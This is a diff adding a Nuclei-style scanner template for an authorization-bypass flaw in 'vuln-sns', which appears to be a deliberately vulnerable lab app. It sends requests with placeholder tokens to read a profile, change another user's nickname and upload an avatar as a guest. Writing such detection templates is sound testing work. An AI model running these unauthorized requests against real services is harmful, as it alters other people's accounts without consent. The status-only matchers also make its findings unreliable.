@@ -1,0 +1,73 @@
+id: vuln-sns-profile-authorization-bypass
+
+info:
+  name: vuln-sns Profile Authorization Bypass
+  author: devin
+  severity: high
+  description: Authorization bypass in profile endpoints through weak token validation
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-285
+  metadata:
+    max-request: 3
+  tags: authz,bypass,profile,vuln-sns
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/profile"
+    
+    headers:
+      Authorization: "Bearer bob_token"
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "bob"
+        part: body
+      
+      - type: status
+        status:
+          - 200
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/profile"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer charlie_token"
+    
+    body: |
+      {
+        "nickname": "Unauthorized update"
+      }
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/profile/avatar"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer guest_token"
+    
+    body: |
+      {
+        "file_id": "test.jpg",
+        "image_data": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+      }
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
